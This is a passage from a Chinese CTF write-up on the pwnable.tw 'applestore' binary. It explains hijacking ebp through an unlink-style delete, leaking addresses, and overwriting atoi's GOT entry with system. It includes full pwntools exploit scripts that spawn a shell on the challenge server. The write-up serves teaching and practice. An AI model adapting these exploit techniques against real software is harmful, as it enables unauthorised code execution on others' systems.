[#2] 0x8048cf5 → main()
────────────────────────────────────────────────────────────────────────────────
$1 = (void *) 0xff851e98
```

可见的确，进入到delete函数中的ebp和在checkout中的ebp是相同的。那么我们便可以劫持ebp到GOT表底部，即`* ebp = 0x0804B044`，然后进行公式计算：

```c
fd[3]=bk
bk[2]=fd
```

```
令：fd[3] = * ebp , bk = 0x0804B044
即：fd + 0xc  = ebp, bk = 0x0804B044
即：fd = ebp - 0xc, bk = 0x0804B044

故：bk[2] = 0x0804B04c，为可写的data段，不会崩溃
```

所以通过构造`fd = ebp - 0xc, bk = 0x0804B044`的结构体，然后delete，返回到handler函数后，ebp即被劫持到0x0804B040，调试如下：

```python
from pwn import *
context(arch='i386',os='linux',log_level='debug')
myelf = ELF('applestore')
libc = ELF('../../my_ubuntu32_libc.so')
io = process(myelf.path)
# libc = ELF("./libc_32.so.6")
# io = remote("chall.pwnable.tw",10104)

add = '2';delete='3';cart='4';checkout='5'

def action(num,payload):
        io.sendlineafter('> ',num)
        io.sendlineafter('> ',payload)
for i in range(6):
        action(add,'1')
for i in range(20):
        action(add,'2')
action(checkout,'y')

payload = 'y\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)
action(cart,payload)

io.recvuntil('27: ')
libc_addr = u32(io.recv(4))-libc.symbols['puts']
io.recvuntil('28: ')
heap_addr = u32(io.recv(4))-0x490

payload = 'y\x00'+p32(heap_addr+0x8b0)+p32(1)+p32(0x0804B070)+p32(1)
action(cart,payload)
io.recvuntil('27: ')
stack_addr = u32(io.recv(4)) 
ebp = stack_addr + 0x20

for i in range(25):
        action(delete,'1')

gdb.attach(io,"b * 0x08048C46\nc\np $ebp")

payload = '2\x00'+p32(myelf.got['puts'])+p32(1)+p32(ebp-0xc)+p32(0x0804B044)
action(delete,payload)

io.interactive()
```

这里断点我下到了delete函数返回后的一句，然后首先删除了前面25个节点，以便于输入的删除的参数是个位数，然后用0x00截断，使得delete可以正常删除我们的栈上的节点，并且第一个元素指向的地址还是需要是可读的，因为delete函数最后一样会打印iphone被从购物车中移除了，所以这里还用的是`myelf.got['puts']`。观察调试器结果如下：

```bash
gef➤  p $ebp
$1 = (void *) 0x804b044
```

果然ebp已经劫持了

#### 劫持ebp与栈迁移的异同

关于栈迁移：

- [CTF-wiki: stack-pivoting](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop-zh/#stack-pivoting)
- [和媳妇一起学Pwn 之 3x17](https://xuanxuanblingbling.github.io/ctf/pwn/2019/09/06/317/)

1. 栈迁移一般是ROP利用的前序步骤，目标是劫持esp寄存器到我们控制的内存上去，然后在ret的时候就可以进入我们布置好的ROP链
2. 栈迁移的原理是先控制ebp寄存器，然后通过leave在控制esp，然后ret。所以控制ebp是栈迁移的前序步骤
3. 例如在3x17这道题中，栈迁移是为了解决劫持了eip，但是不知道往哪跳的问题，因为从`劫持控制流`到`漏洞利用`之间还有程序状需要满足（例如函数参数，需要栈上或者寄存器的值要满足一定的条件）
4. 还有人说，栈迁移主要是为了解决栈溢出可以溢出空间大小不足的问题

- 本题是劫持ebp后，通过函数逻辑中的输入控制了栈上的数据，这个输入到栈空间的位置，是由ebp决定的。
- 而栈迁移后面跟的是ROP，布置的ROP链跟esp相关。

劫持ebp的途径：

1. 如本题，修改ebp寄存器指向的内存，然后leave，ret，回到父级函数时，ebp已经被劫持
2. 已经可以控制程序流，则可以跳转到一些gadget进而控制ebp

劫持esp的途径：

1. 在劫持ebp的前提下，再次进行leave，ret时即直接进入ROP链

故把劫持ebp和esp路径连起来：

1. 如果攻击者起始的能力是只能控制关键内存，则可以通过两次leave，ret，完成栈迁移，第一次控制ebp，第二次控制esp
2. 如果攻击者起始能力是能控制eip，则可以同一次跳转，一次leave，ret，完成栈迁移，第一次控制ebp，第二次控制esp


#### 覆盖GOT表

回到本题，我们通过delete函数劫持了ebp，那么我们现在回到了handler函数，handler函数本身一样接受一个输入，并保存到栈上，当前栈基址即ebp已经是GOT表尾地址，故已经可以覆盖部分GOT表内容了，即ebp-0x22到ebp-0xc中间的内容

```c
unsigned int handler()
{
  char nptr; // [esp+16h] [ebp-22h]
  unsigned int v2; // [esp+2Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  while ( 1 )
  {
    printf("> ");
    fflush(stdout);
    my_read(&nptr, 0x15u);
    switch ( atoi(&nptr) )
```

不过我们可以看到，handler函数用到了atoi函数，其参数为ebp-0x22处的内存地址，并且atoi这个函数，在GOT表的尾部，那么我们其实可以劫持ebp的时候在往下一点，然后更优雅的劫持atoi的GOT表项为system函数，&nptr为我们可控的第一个字节的地址。所以我们可以构造如下payload：

![image](https://xuanxuanblingbling.github.io/assets/pic/applestore/got.png)

即构造进入hander后的ebp-0x22为`GOT['asprintf']`，即在delete函数中的满足约束：`*ebp = GOT['asprintf'] + 0x22`，故有计算：

```c
fd[3]=bk
bk[2]=fd
```

```
(第一种）
令：fd[3] = * ebp , bk = GOT['asprintf'] + 0x22
即：fd + 0xc  = ebp, bk = GOT['asprintf'] + 0x22
即：fd = ebp - 0xc, bk = GOT['asprintf'] + 0x22

故：bk[2] = GOT['asprintf'] + 0x22 + 0x8 = GOT['asprintf'] + 0x2a，位于bss段，仍然可写


(第二种）
令：bk[2] = * ebp , fd = GOT['asprintf'] + 0x22
即：bk + 0x8  = ebp, fd = GOT['asprintf'] + 0x22
即：bk = ebp - 0x8, fd = GOT['asprintf'] + 0x22

故：fd[3] = GOT['asprintf'] + 0x22 + 0xc = GOT['asprintf'] + 0x2e，位于bss段，仍然可写

(总结)
fd = ebp - 0xc, bk = GOT['asprintf'] + 0x22
bk = ebp - 0x8, fd = GOT['asprintf'] + 0x22
```

故构造以下payload均可：

```python
payload = '2\x00'+p32(myelf.got['puts'])+p32(1)+p32(ebp-0xc)+p32(myelf.got['asprintf']+0x22)
payload = '2\x00'+p32(myelf.got['puts'])+p32(1)+p32(myelf.got['asprintf']+0x22)+p32(ebp-0x8)
```

然后即可以按上图覆盖GOT表，以下payload均可：

```python
payload = 'sh\x00\x00'+p32(libc_addr+libc.symbols['system'])
payload = '$0\x00\x00'+p32(libc_addr+libc.symbols['system'])
```

`system("$0")和system("sh")`均可getshell，因为利用system函数执行是可以利用shell的环境变量的，最终完整exp如下：

### 完整exp

```python
from pwn import *
context(arch='i386',os='linux',log_level='debug')
myelf = ELF('applestore')
libc = ELF("./libc_32.so.6")
io = remote("chall.pwnable.tw",10104)
add = '2';delete='3';cart='4';checkout='5'

def action(num,payload):
        io.sendlineafter('> ',num)
        io.sendlineafter('> ',payload)
for i in range(6):
        action(add,'1')
for i in range(20):
        action(add,'2')

action(checkout,'y')
payload = 'y\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)
action(cart,payload)
io.recvuntil('27: ')
libc_addr = u32(io.recv(4))-libc.symbols['puts']
io.recvuntil('28: ')
heap_addr = u32(io.recv(4))-0x490
payload = 'y\x00'+p32(heap_addr+0x8b0)+p32(1)+p32(0x0804B070)+p32(1)
action(cart,payload)
io.recvuntil('27: ')
ebp = u32(io.recv(4))+0x20
for i in range(25):
        action(delete,'1')
#payload = '2\x00'+p32(myelf.got['puts'])+p32(1)+p32(ebp-0xc)+p32(myelf.got['asprintf']+0x22)
payload = '2\x00'+p32(myelf.got['puts'])+p32(1)+p32(myelf.got['asprintf']+0x22)+p32(ebp-0x8)
action(delete,payload)
payload = 'sh\x00\x00'+p32(libc_addr+libc.symbols['system'])
io.sendlineafter("> ",payload)

# gdb.attach(io,"b * 0x8048beb")
io.interactive()
```

## 总结

本题